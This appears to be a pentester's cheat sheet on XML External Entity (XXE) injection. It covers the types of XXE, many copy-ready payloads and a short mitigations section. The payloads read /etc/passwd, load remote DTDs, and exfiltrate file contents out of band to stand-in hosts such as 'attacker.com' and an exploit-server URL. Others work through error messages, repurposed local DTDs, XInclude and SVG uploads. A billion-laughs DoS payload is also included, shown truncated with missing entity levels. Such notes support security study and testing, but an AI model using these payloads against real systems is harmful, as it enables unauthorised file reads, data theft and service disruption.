
XML External Entity (XXE) vulnerabilities occur when an application processes XML input and allows the inclusion of external entities. This can be exploited to access sensitive information, execute server-side requests, or perform denial-of-service (DoS) attacks.

**[Complete Payloads List](https://github.com/payloadbox/xxe-injection-payload-list)

---

## **Types of XXE Vulnerabilities**

1. **In-band XXE:**  
	- The attacker gets the response directly from the server.
    - **Example:** Reading local files via `file://` scheme.

2. **Out-of-band (OOB) XXE:**  
    - The attacker receives the data via an external server (useful when in-band response is blocked).    
    - **Example:** Using HTTP requests to exfiltrate data.

3. **DoS-based XXE:**  
    - Leveraging recursive entity definitions to exhaust server resources.
    - **Example:** Billion laughs attack (`&lol9;` nested entities).

---

## **Exploitation Techniques**

### Common Payloads

**[Complete Payloads List](https://github.com/payloadbox/xxe-injection-payload-list)

#### **Read local files:**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>  
<foo>&xxe;</foo>
```

#### **Remote file inclusion:**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://malicious.com/evil.dtd">]>  
<foo>&xxe;</foo>
```

#### **Billion laughs attack:**

```xml
<!DOCTYPE lolz [  
<!ENTITY lol "lol">  
<!ENTITY lol2 "&lol;&lol;">  
<!ENTITY lol3 "&lol2;&lol2;">  
<!ENTITY lol9 "&lol8;&lol8;">]>  
<foo>&lol9;</foo>
```

#### **Exfiltration via OOB:**

```xml
<!DOCTYPE data [<!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd">]>  
<foo>&xxe;</foo>
```

#### **Exfiltration via malicious external DTD:**

`https://exploit-0a8500e0036d98ed810210e0013e00c1.exploit-server.net/exploit.dtd`

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0a8500e0036d98ed810210e0013e00c1.exploit-server.net/exploit.dtd/?x=%file;'>">
%eval;
%exfiltrate;
```

`Payload`

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://exploit-0a8500e0036d98ed810210e0013e00c1.exploit-server.net/exploit.dtd"> %xxe;]>
```

#### **Error-based Exfiltration via external DTD:**

`https://exploit-0a8500e0036d98ed810210e0013e00c1.exploit-server.net/exploit.dtd`

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; 
%error;
```

`Payload`

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://exploit-0a8500e0036d98ed810210e0013e00c1.exploit-server.net/exploit.dtd"> %xxe;]>
```

#### **Repurposing a Local DTD:**

`Search for local DTD`

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

Since this XXE attack involves repurposing an existing DTD on the server filesystem, a key requirement is to locate a suitable file. This is actually quite straightforward. Because the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.

For example, Linux systems using the GNOME desktop environment often have a DTD file at `/usr/share/yelp/dtd/docbookx.dtd`.

After you have tested a list of common DTD files to locate a file that is present, you then need to obtain a copy of the file and review it to find an entity that you can redefine. Since many common systems that include DTD files are open source, you can normally quickly obtain a copy of files through internet search. For e.g. ISOamsa as shown below:

`Payload:`

```dtd
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

#### **Hidden Attack Surface XXE:**

**XInclude Attack :**

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**XXE attacks via file upload :**

Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

**XXE attacks via modified content type :**

Most POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.
If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.

---
## **Mitigations**

2. **Disable External Entities:**  
    - Ensure XML parsers do not process external entities:

```java
factory.setFeature("http://xml.org/sax/features/external-general-entities", false); factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

3. **Use Secure Libraries:**  
    - Opt for parsers that are not vulnerable to XXE by default (e.g., `defusedxml` in Python).

4. **Input Validation:**  
    - Restrict the type and structure of accepted XML inputs.

5. **Content Security Policies (CSP):**  
    - Limit network connectivity from backend servers to prevent OOB data exfiltration.

6. **Access Control:**  
    - Restrict file system access to XML parsers to prevent unauthorized file reads.

7. **Monitoring and Logging:**  
    - Monitor suspicious requests and log parsing errors or unauthorized access attempts.

